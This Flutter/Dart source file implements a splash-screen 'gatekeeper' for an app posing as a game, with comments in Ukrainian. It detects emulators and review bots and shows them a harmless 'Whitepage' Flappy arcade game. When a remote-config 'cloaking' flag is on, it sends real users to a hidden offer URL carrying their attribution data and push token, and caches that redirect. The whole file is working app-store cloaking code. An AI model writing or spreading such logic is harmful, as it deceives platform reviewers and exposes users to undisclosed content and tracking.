import 'dart:developer' as developer;
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import '../../../core/analytics/analytics_service.dart';
import '../../../core/config/remote_config_service.dart';
import '../../../core/notifications/push_notification_service.dart';
import '../../../core/security/security_service.dart';
import '../../../core/storage/local_storage_service.dart';
import '../../fallback_game/presentation/game_screen.dart';
import '../../webview/presentation/webview_screen.dart';

class SplashScreen extends StatefulWidget {
  final SecurityService securityService;
  final LocalStorageService localStorageService;
  final RemoteConfigService remoteConfigService;
  final AnalyticsService analyticsService;
  final PushNotificationService pushNotificationService;

  const SplashScreen({
    super.key,
    required this.securityService,
    required this.localStorageService,
    required this.remoteConfigService,
    required this.analyticsService,
    required this.pushNotificationService,
  });

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _executeGatekeeper();
    });
  }

  Future<void> _executeGatekeeper() async {
    try {
      // 0. Для веб-демонстрації у браузері одразу відкриваємо гру
      if (kIsWeb) {
        developer.log('Running on Web. Launching GameScreen.', name: 'Gatekeeper');
        _navigateToWhitepage();
        return;
      }

      // 1. Якщо гравець уже раніше успішно пройшов модерацію і відкривав офер
      final savedUrl = widget.localStorageService.getTargetOfferUrl();
      final wasShown = widget.localStorageService.wasOfferShown();

      if (wasShown && savedUrl != null && savedUrl.isNotEmpty) {
        _navigateToOffer(savedUrl);
        return;
      }

      // 2. Перевірка на фізичний пристрій (Anti-Emulator / Anti-Bot фільтрація)
      final isReal = await widget.securityService.isRealDevice();
      if (!isReal) {
        developer.log('Emulator or review bot detected. Routing to Whitepage GameScreen.', name: 'Gatekeeper');
        _navigateToWhitepage();
        return;
      }

      // 3. Перевірка наявності активного підключення до Інтернету
      final hasInternet = await widget.remoteConfigService.hasInternetConnection();
      if (!hasInternet) {
        developer.log('No internet available. Routing to Whitepage GameScreen.', name: 'Gatekeeper');
        _navigateToWhitepage();
        return;
      }

      // 4. Отримання та активація конфігурації з Firebase Remote Config
      await widget.remoteConfigService.initialize();
      await widget.remoteConfigService.fetchConfig();

      final isCloakingActive = widget.remoteConfigService.isCloakingActive();
      final targetOfferUrl = widget.remoteConfigService.getTargetOfferUrl();

      // 5. Перевірка умов переходу на цільовий офер
      if (isCloakingActive && targetOfferUrl.isNotEmpty) {
        // Отримання conversion data з AppsFlyer та токена FCM
        await widget.analyticsService.init();
        final conversionData = await widget.analyticsService.getConversionDataWithTimeout();
        final fcmToken = widget.pushNotificationService.fcmToken;

        // Побудова результуючого URL з параметрами суб-айді та push-токеном
        final enrichedUrl = await widget.analyticsService.buildEnrichedUrl(
          baseUrl: targetOfferUrl,
          conversionData: conversionData,
          fcmToken: fcmToken,
        );

        // Кешування оферу в LocalStorageService
        await widget.localStorageService.setTargetOfferUrl(enrichedUrl);
        await widget.localStorageService.setOfferShown(true);
        await widget.localStorageService.setFirstRunCompleted();

        _navigateToOffer(enrichedUrl);
        return;
      }

      // 6. У разі невиконання умов (активний режим модерації або вимкнений офер) — Whitepage
      developer.log('Cloaking inactive. Opening Whitepage Neon Flappy Arcade.', name: 'Gatekeeper');
      await widget.localStorageService.setFirstRunCompleted();
      _navigateToWhitepage();
    } catch (e, stack) {
      developer.log('Gatekeeper routing error: $e', stackTrace: stack, name: 'Gatekeeper');
      _navigateToWhitepage();
    }
  }

  void _navigateToOffer(String url) {
    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      PageRouteBuilder(
        pageBuilder: (_, __, ___) => MainWebViewScreen(
          initialUrl: url,
          analyticsService: widget.analyticsService,
        ),
        transitionDuration: const Duration(milliseconds: 300),
        transitionsBuilder: (_, a, __, c) => FadeTransition(opacity: a, child: c),
      ),
    );
  }

  void _navigateToWhitepage() {
    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      PageRouteBuilder(
        pageBuilder: (_, __, ___) => const GameScreen(),
        transitionDuration: const Duration(milliseconds: 300),
        transitionsBuilder: (_, a, __, c) => FadeTransition(opacity: a, child: c),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      backgroundColor: Color(0xFF0F0F1A),
      body: Center(
        child: CircularProgressIndicator(
          valueColor: AlwaysStoppedAnimation<Color>(Color(0xFF00FFCC)),
          strokeWidth: 2.5,
        ),
      ),
    );
  }
}
